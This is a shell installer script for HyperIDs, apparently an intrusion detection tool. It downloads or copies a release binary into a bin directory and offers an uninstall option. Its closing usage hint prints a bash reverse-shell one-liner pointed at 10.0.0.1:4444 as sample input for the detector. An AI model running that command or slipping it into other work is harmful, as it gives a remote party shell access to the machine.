#!/bin/sh
# HyperIDs — one-shot installer
#
# Usage (public repo, one-liner):
#   curl -fsSL https://github.com/ohmydevelop/hyperids/releases/latest/download/install.sh | sh
#   ./install.sh                      # install a binary next to me to ~/.local/bin
#   ./install.sh --prefix /usr/local  # system-wide (needs write permission)
#   ./install.sh --uninstall
#
# Environment: PREFIX, VERSION
set -e

REPO="ohmydevelop/hyperids"
DEFAULT_VERSION="v1.5.1"
BIN_NAME="hyperids"
ARCH="$(uname -m)"
OS="$(uname -s)"

usage() {
  cat <<'EOF'
HyperIDs installer

  ./install.sh                     # install to $HOME/.local/bin
  ./install.sh --prefix /usr/local # install system-wide
  ./install.sh --version v1.1.0    # pick a release tag
  ./install.sh --uninstall         # remove from ~/.local/bin and /usr/local/bin

Environment: PREFIX, VERSION
EOF
}

# ---- parse args first ----
VERSION="${VERSION:-$DEFAULT_VERSION}"
PREFIX_ARG=""
DO_UNINSTALL=0
while [ $# -gt 0 ]; do
  case "$1" in
    --uninstall|-u) DO_UNINSTALL=1 ;;
    --prefix) PREFIX_ARG="$2"; shift ;;
    --version) VERSION="$2"; shift ;;
    --help|-h) usage; exit 0 ;;
    *) echo "unknown arg: $1" >&2; usage; exit 2 ;;
  esac
  shift
done

PREFIX="${PREFIX_ARG:-${PREFIX:-$HOME/.local}}"
BIN_DIR="$PREFIX/bin"
TARGET="$BIN_DIR/$BIN_NAME"

case "$OS-$ARCH" in
  Linux-x86_64|Linux-amd64) ASSET="hyperids-linux-x86_64" ;;
  Linux-aarch64|Linux-arm64) ASSET="hyperids-linux-aarch64" ;;
  *) echo "unsupported platform: $OS-$ARCH (only linux x86_64/aarch64 assets exist)" >&2; exit 2 ;;
esac

# ---- uninstall ----
if [ "$DO_UNINSTALL" = 1 ]; then
  for d in "$BIN_DIR" "$HOME/.local/bin" /usr/local/bin; do
    [ -e "$d/$BIN_NAME" ] && { echo "removing $d/$BIN_NAME"; rm -f "$d/$BIN_NAME"; }
  done
  echo "uninstalled."
  exit 0
fi

mkdir -p "$BIN_DIR"

# ---- local binary next to this script takes priority ----
LOCAL="$(dirname "$0")/$ASSET"
if [ -f "$LOCAL" ]; then
  echo "installing local $LOCAL -> $TARGET"
  install -m 0755 "$LOCAL" "$TARGET"
else
  URL="https://github.com/$REPO/releases/download/$VERSION/$ASSET"
  tmp="$(mktemp -d)"
  downloaded=0
  # public repo: plain curl first (no auth); fall back to gh / GITHUB_TOKEN
  if command -v curl >/dev/null 2>&1; then
    echo "downloading $URL"
    curl -fL --retry 3 -o "$tmp/$BIN_NAME" "$URL" && downloaded=1
  fi
  if [ "$downloaded" != 1 ] && command -v gh >/dev/null 2>&1 && gh auth status >/dev/null 2>&1; then
    echo "plain download failed; trying gh ($VERSION/$ASSET)"
    gh release download "$VERSION" -R "$REPO" -p "$ASSET" -O "$tmp/$BIN_NAME" --clobber && downloaded=1
  fi
  if [ "$downloaded" != 1 ] && [ -n "${GITHUB_TOKEN:-}" ] && command -v curl >/dev/null 2>&1; then
    echo "trying GITHUB_TOKEN"
    curl -fL --retry 3 -H "Authorization: token $GITHUB_TOKEN" -o "$tmp/$BIN_NAME" "$URL" && downloaded=1
  fi
  [ "$downloaded" = 1 ] || { echo "download failed" >&2; exit 1; }
  chmod 0755 "$tmp/$BIN_NAME"
  echo "installing -> $TARGET"
  mv "$tmp/$BIN_NAME" "$TARGET"
  rm -rf "$tmp"
fi

echo
echo "HyperIDs installed to $TARGET"
case ":$PATH:" in
  *":$BIN_DIR:"*) ;;
  *) echo "NOTE: $BIN_DIR is not on your PATH."; echo "  add:  export PATH=\"$BIN_DIR:\$PATH\"" ;;
esac
echo
echo "Try it:"
echo "  hyperids 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"
